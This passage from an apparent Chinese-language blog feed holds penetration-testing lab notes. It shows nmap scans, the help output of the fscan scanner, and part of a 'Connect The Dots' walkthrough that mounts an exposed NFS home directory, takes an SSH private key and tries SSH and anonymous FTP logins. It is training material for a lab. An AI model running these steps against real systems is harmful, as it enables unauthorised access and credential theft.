cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.6<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 11.27 seconds<br></code></pre></td></tr></table></figure><p>开放了 22 和 80 端口，debian 操作系统</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --top-ports 20 -sU 192.1.1.138<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-16 22:28 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> nyx.zte.com.cn (192.1.1.138)<br>Host is up (0.00027s latency).<br><br>PORT      STATE         SERVICE<br>53/udp    closed        domain<br>67/udp    closed        dhcps<br>68/udp    open|filtered dhcpc<br>69/udp    open|filtered tftp<br>123/udp   open|filtered ntp<br>135/udp   closed        msrpc<br>137/udp   open|filtered netbios-ns<br>138/udp   closed        netbios-dgm<br>139/udp   closed        netbios-ssn<br>161/udp   closed        snmp<br>162/udp   open|filtered snmptrap<br>445/udp   closed        microsoft-ds<br>500/udp   open|filtered isakmp<br>514/udp   closed        syslog<br>520/udp   closed        route<br>631/udp   closed        ipp<br>1434/udp  open|filtered ms-sql-m<br>1900/udp  open|filtered upnp<br>4500/udp  closed        nat-t-ike<br>49152/udp open|filtered unknown<br>MAC Address: 00:0C:29:A7:F7:7B (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 5.84 seconds<br></code></pre></td></tr></table></figure><p>udp 的扫描结果仅供参考</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --script=vuln -p22,80 192.1.1.138          <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-16 22:29 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> nyx.zte.com.cn (192.1.1.138)<br>Host is up (0.00023s latency).<br><br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>| http-enum: <br>|_  /d41d8cd98f00b204e9800998ecf8427e.php: Seagate BlackArmorNAS 110/220/440 Administrator Password Reset Vulnerability<br>|_http-dombased-xss: Couldn\<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">|_http-csrf: Couldn\&#x27;</span>t find any CSRF vulnerabilities.<br>|_http-stored-xss: Couldn\<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">MAC Address: 00:0C:29:A7:F7:7B (VMware)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 31.85 seconds</span><br></code></pre></td></tr></table></figure><p>Kali Linux 上 fscan 安装</p><ul><li>go 环境安装<ul><li><code>rm -rf /usr/local/go &amp;&amp; tar -C /usr/local -xzf go1.20.5.linux-amd64.tar.gz</code> 可能需要 sudo 权限</li><li>将 <code>export PATH=$PATH:/usr/local/go/bin</code> 写入用户目录下的 <code>.zshrc</code> 文件</li></ul></li><li>build<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/tools/fscan]<br>└─$ go build -ldflags=<span class="hljs-string">&quot;-s -w &quot;</span> -trimpath main.go<br></code></pre></td></tr></table></figure></li><li>运行<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/tools/fscan]<br>└─$ ./main -h<br><br>   ___                              _    <br>  / _ \     ___  ___ _ __ __ _  ___| | __ <br> / /_\/____/ __|/ __| __/ _` |/ __| |/ /<br>/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    <br>\____/     |___/\___|_|  \__,_|\___|_|\_\   <br>                     fscan version: 1.8.2<br>flag needs an argument: -h<br>Usage of ./main:<br>  -br int<br>        Brute threads (default 1)<br>  -c string<br>        <span class="hljs-built_in">exec</span> <span class="hljs-built_in">command</span> (ssh|wmiexec)<br>  -cookie string<br>        <span class="hljs-built_in">set</span> poc cookie,-cookie rememberMe=login<br>  -debug int<br>        every time to LogErr (default 60)<br>  -dns<br>        using dnslog poc<br>  -domain string<br>        smb domain<br>  -full<br>        poc full scan,as: shiro 100 key<br>  -h string<br>        IP address of the host you want to scan,<span class="hljs-keyword">for</span> example: 192.168.11.11 | 192.168.11.11-255 | 192.168.11.11,192.168.11.12<br>  -<span class="hljs-built_in">hash</span> string<br>        <span class="hljs-built_in">hash</span><br>  -hf string<br>        host file, -hf ip.txt<br>  -hn string<br>        the hosts no scan,as: -hn 192.168.1.1/24<br>  -m string<br>        Select scan <span class="hljs-built_in">type</span> ,as: -m ssh (default <span class="hljs-string">&quot;all&quot;</span>)<br>  -no<br>        not to save output <span class="hljs-built_in">log</span><br>  -nobr<br>        not to Brute password<br>  -nopoc<br>        not to scan web vul<br>  -np<br>        not to ping<br>  -num int<br>        poc rate (default 20)<br>  -o string<br>        Outputfile (default <span class="hljs-string">&quot;result.txt&quot;</span>)<br>  -p string<br>        Select a port,<span class="hljs-keyword">for</span> example: 22 | 1-65535 | 22,80,3306 (default <span class="hljs-string">&quot;21,22,80,81,135,139,443,445,1433,1521,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017&quot;</span>)<br>  -pa string<br>        add port base DefaultPorts,-pa 3389<br>  -path string<br>        fcgi、smb romote file path<br>  -ping<br>        using ping replace icmp<br>  -pn string<br>        the ports no scan,as: -pn 445<br>  -pocname string<br>        use the pocs these contain pocname, -pocname weblogic<br>  -pocpath string<br>        poc file path<br>  -portf string<br>        Port File<br>  -proxy string<br>        <span class="hljs-built_in">set</span> poc proxy, -proxy http://127.0.0.1:8080<br>  -<span class="hljs-built_in">pwd</span> string<br>        password<br>  -pwda string<br>        add a password base DefaultPasses,-pwda password<br>  -pwdf string<br>        password file<br>  -rf string<br>        redis file to write sshkey file (as: -rf id_rsa.pub) <br>  -rs string<br>        redis shell to write cron file (as: -rs 192.168.1.1:6666) <br>  -sc string<br>        ms17 shellcode,as -sc add<br>  -silent<br>        silent scan<br>  -socks5 string<br>        <span class="hljs-built_in">set</span> socks5 proxy, will be used <span class="hljs-keyword">in</span> tcp connection, <span class="hljs-built_in">timeout</span> setting will not work<br>  -sshkey string<br>        sshkey file (id_rsa)<br>  -t int<br>        Thread nums (default 600)<br>  -time int<br>        Set <span class="hljs-built_in">timeout</span> (default 3)<br>  -top int<br>        show live len top (default 10)<br>  -u string<br>        url<br>  -uf string<br>        urlfile<br>  -user string<br>        username<br>  -usera string<br>        add a user base DefaultUsers,-usera user<br>  -userf string<br>        username file<br>  -wmi<br>        start wmi<br>  -wt int<br>        Set web <span class="hljs-built_in">timeout</span> (default 5)<br></code></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>postgraduate</category>
      
      <category>experiment</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Connect The Dots</title>
    <link href="/2023/06/4719fa4167fd.html"/>
    <url>/2023/06/4719fa4167fd.html</url>
    
    <content type="html"><![CDATA[<h1 id="Connect-The-Dots"><a href="#Connect-The-Dots" class="headerlink" title="Connect The Dots"></a>Connect The Dots</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.56.112            <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-12 09:34 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.112<br>Host is up (0.000085s latency).<br>Not shown: 65526 closed tcp ports (reset)<br>PORT      STATE SERVICE<br>21/tcp    open  ftp<br>80/tcp    open  http<br>111/tcp   open  rpcbind<br>2049/tcp  open  nfs<br>7822/tcp  open  unknown<br>33547/tcp open  unknown<br>34175/tcp open  unknown<br>40731/tcp open  unknown<br>44757/tcp open  unknown<br>MAC Address: 08:00:27:33:4B:05 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 2.44 seconds<br><br>┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sT -sV -O -p21,80,111,2049,7822 192.168.56.112<br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-12 09:36 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.112<br>Host is up (0.00047s latency).<br><br>PORT     STATE SERVICE VERSION<br>21/tcp   open  ftp     vsftpd 2.0.8 or later<br>80/tcp   open  http    Apache httpd 2.4.38 ((Debian))<br>111/tcp  open  rpcbind 2-4 (RPC <span class="hljs-comment">#100000)</span><br>2049/tcp open  nfs_acl 3 (RPC <span class="hljs-comment">#100227)</span><br>7822/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)<br>MAC Address: 08:00:27:33:4B:05 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 12.93 seconds<br><br>┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --top-ports 20 -sU 192.168.56.112              <br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-12 09:37 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.112<br>Host is up (0.00030s latency).<br><br>PORT      STATE         SERVICE<br>53/udp    closed        domain<br>67/udp    open|filtered dhcps<br>68/udp    open|filtered dhcpc<br>69/udp    open|filtered tftp<br>123/udp   closed        ntp<br>135/udp   closed        msrpc<br>137/udp   closed        netbios-ns<br>138/udp   closed        netbios-dgm<br>139/udp   closed        netbios-ssn<br>161/udp   open|filtered snmp<br>162/udp   closed        snmptrap<br>445/udp   open|filtered microsoft-ds<br>500/udp   open|filtered isakmp<br>514/udp   open|filtered syslog<br>520/udp   closed        route<br>631/udp   open|filtered ipp<br>1434/udp  closed        ms-sql-m<br>1900/udp  closed        upnp<br>4500/udp  closed        nat-t-ike<br>49152/udp closed        unknown<br>MAC Address: 08:00:27:33:4B:05 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 7.62 seconds<br></code></pre></td></tr></table></figure><p>nmap自带脚本的漏洞扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --script=vuln -p21,80,111,2049,7822 192.168.56.112<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-12 09:40 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.112<br>Host is up (0.00020s latency).<br><br>PORT     STATE SERVICE<br>21/tcp   open  ftp<br>80/tcp   open  http<br>| http-fileupload-exploiter: <br>|   <br>|     Couldn\<span class="hljs-string">&#x27;t find a file-type field.</span><br><span class="hljs-string">|   </span><br><span class="hljs-string">|     Couldn\&#x27;</span>t find a file-type field.<br>|   <br>|_    Couldn\<span class="hljs-string">&#x27;t find a file-type field.</span><br><span class="hljs-string">|_http-stored-xss: Couldn\&#x27;</span>t find any stored XSS vulnerabilities.<br>|_http-dombased-xss: Couldn\<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">| http-internal-ip-disclosure: </span><br><span class="hljs-string">|_  Internal IP Leaked: 127.0.1.1</span><br><span class="hljs-string">|_http-csrf: Couldn\&#x27;</span>t find any CSRF vulnerabilities.<br>| http-sql-injection: <br>|   Possible sqli <span class="hljs-keyword">for</span> queries:<br>|     http://192.168.56.112:80/mysite/?C=N%3BO%3DD%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=S%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=M%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=D%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=S%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=M%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=N%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=D%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=S%3BO%3DD%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=M%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=N%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=D%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=S%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=D%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=N%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=M%3BO%3DD%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=D%3BO%3DD%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=S%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=M%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=N%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=N%3BO%3DD%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=S%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=M%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=D%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=S%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=M%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=N%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=D%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=S%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=M%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=N%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=D%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=S%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=M%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=N%3BO%3DA%27%20OR%20sqlspider<br>|_    http://192.168.56.112:80/mysite/?C=D%3BO%3DA%27%20OR%20sqlspider<br>| http-enum: <br>|   /images/: Potentially interesting directory w/ listing on <span class="hljs-string">&#x27;apache/2.4.38 (debian)&#x27;</span><br>|_  /manual/: Potentially interesting folder<br>111/tcp  open  rpcbind<br>2049/tcp open  nfs<br>7822/tcp open  unknown<br>MAC Address: 08:00:27:33:4B:05 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 31.11 seconds<br></code></pre></td></tr></table></figure><p>信息比较杂乱，这里汇总一下,开放的端口有：21 ftp、80 http、111 rpcbind、2049 nfs、7822 ssh，一些临时动态端口（五位数的），可能开放的有价值的端口有：69 tftp、445 smb。顺便试错，看看 tftp 到底开放了没有，直接去连接</p><h2 id="nfs-渗透"><a href="#nfs-渗透" class="headerlink" title="nfs 渗透"></a>nfs 渗透</h2><p>首先 <code>showmount</code> 看看有哪些挂载点，然后在 tmp 文件夹中创建新文件夹，挂载到本机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ showmount -e 192.168.56.112  <br>Export list <span class="hljs-keyword">for</span> 192.168.56.112:<br>/home/morris *<br><br>┌──(kali㉿kali)-[~]<br>└─$ <span class="hljs-built_in">mkdir</span> /tmp/infosec                                         <br><br>┌──(kali㉿kali)-[~]<br>└─$ sudo mount -t nfs 192.168.56.112:/home/morris /tmp/infosec      <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br><br>┌──(kali㉿kali)-[~]<br>└─$ <span class="hljs-built_in">cd</span> /tmp/infosec<br></code></pre></td></tr></table></figure><p>查看挂载点中有哪些文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/tmp/infosec]<br>└─$ <span class="hljs-built_in">ls</span> -liah<br>total 56K<br> 131648 drwxr-xr-x  8 kali kali 4.0K Oct 11  2019 .<br>4194305 drwxrwxrwt 16 root root 4.0K Jun 12 08:59 ..<br> 179003 -rw-------  1 kali kali    1 Oct 11  2019 .bash_history<br> 134179 -rw-r--r--  1 kali kali  220 Oct 10  2019 .bash_logout<br> 134178 -rw-r--r--  1 kali kali 3.5K Oct 10  2019 .bashrc<br> 179000 drwx------  9 kali kali 4.0K Oct 10  2019 .cache<br> 179011 drwx------ 10 kali kali 4.0K Oct 11  2019 .config<br> 178998 drwx------  3 kali kali 4.0K Oct 10  2019 .gnupg<br> 179012 -rw-------  1 kali kali 1.9K Oct 11  2019 .ICEauthority<br> 179032 drwx------  3 kali kali 4.0K Oct 10  2019 .<span class="hljs-built_in">local</span><br> 134182 -rw-r--r--  1 kali kali  807 Oct 10  2019 .profile<br> 179139 drwx------  2 kali kali 4.0K Oct 10  2019 .ssh<br> 179081 drwxr-xr-x  2 kali kali 4.0K Oct 10  2019 Templates<br></code></pre></td></tr></table></figure><p>bash_history 虽然重要，但是这里文件大小显示出其并没有那么大的价值，首先看看.ssh 目录下有哪些东西</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/tmp/infosec]<br>└─$ <span class="hljs-built_in">cd</span> .ssh <br><br>┌──(kali㉿kali)-[/tmp/infosec/.ssh]<br>└─$ <span class="hljs-built_in">ls</span> -liah<br>total 16K<br>179139 drwx------ 2 kali kali 4.0K Oct 10  2019 .<br>131648 drwxr-xr-x 8 kali kali 4.0K Oct 11  2019 ..<br>178994 -rw------- 1 kali kali 1.8K Oct 11  2019 id_rsa<br>179004 -rw-r--r-- 1 kali kali  395 Oct 11  2019 id_rsa.pub<br></code></pre></td></tr></table></figure><p>查看公钥内容，得到了用户名和主机名，接下来尝试把私钥拷贝到本机，尝试用私钥看看能不能直接登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/tmp/infosec/.ssh]<br>└─$ <span class="hljs-built_in">cat</span> id_rsa.pub<br>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuTwJDj/B/FtGRkTEiwpoq52/jXtaeB2/R4+hyvAo6FuWeGvl+dvkgBkA5dL647UJXx6DUTh+xkZSav9BKOeSpZ2qcUP8lMf+H9j5LChu/E5B7dZEUDJAm8QzwJJIIDGhVoqdyVVL4kU8vOzdgLHjxj9VRsoHICuum6/SHDdTGUcQV1fFgYlZrrNcVeWZtEudN6PXF8JrjmGcLliVKRrntucCe/quT7HMHOcsnZDayumfKK/P/p825ZvnHtHPazgh41SmLbgltOz+V1NBYrGNPwrrZgZw2lKuDVExW+tRy5Qr9t92KS7JEE2626vNcG9DRpNDt9iRMWAfoGfloJ9Nf morris@sirrom<br> <br></code></pre></td></tr></table></figure><p>尝试用私钥登录，另外信息搜集的结果中 22 端口并没有开放，7822 端口对应 ssh 服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/connectthedots]<br>└─$ ssh -i id_rsa morris@192.168.56.112 -p 7822<br>morris@192.168.56.112<span class="hljs-string">&#x27;s password:</span><br></code></pre></td></tr></table></figure><p>显示需要密码，那就只能暂时搁置，接着考虑如何获取到密码</p><h2 id="ftp-渗透"><a href="#ftp-渗透" class="headerlink" title="ftp 渗透"></a>ftp 渗透</h2><p>尝试 ftp 匿名登录，另外刚才查看公钥得到了一个新的用户名，都可以试一试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/connectthedots]<br>└─$ ftp 192.168.56.112<br>Connected to 192.168.56.112.<br>220 Welcome to Heaven!<br>Name (192.168.56.112:kali): anonymous<br>530 